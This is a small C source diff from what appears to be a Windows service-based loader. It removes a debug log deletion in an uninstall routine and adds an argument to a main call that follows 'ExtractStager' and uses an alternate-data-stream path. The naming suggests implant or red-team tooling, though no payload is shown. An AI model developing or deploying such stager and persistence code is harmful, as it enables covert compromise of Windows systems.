@@ -278,9 +278,6 @@ void UnInstall(){
 		CloseServiceHandle(schSCManager);	
 	}
 
-#ifdef _DBG
-	DeleteFile(LOG_FILE);
-#endif
 }
 
 //=========================================================================
@@ -407,7 +404,7 @@ DWORD WINAPI InvokeMainWrapper(LPVOID lpParam ) {
         ExtractStager( pPath );
 
 	//Call main
-	if( !InvokeMain( &serviceName, adsPath ))
+	if( !InvokeMain( &serviceName, adsPath, NULL ))
 		SetEvent(stopEvent);
 
 	return 0;
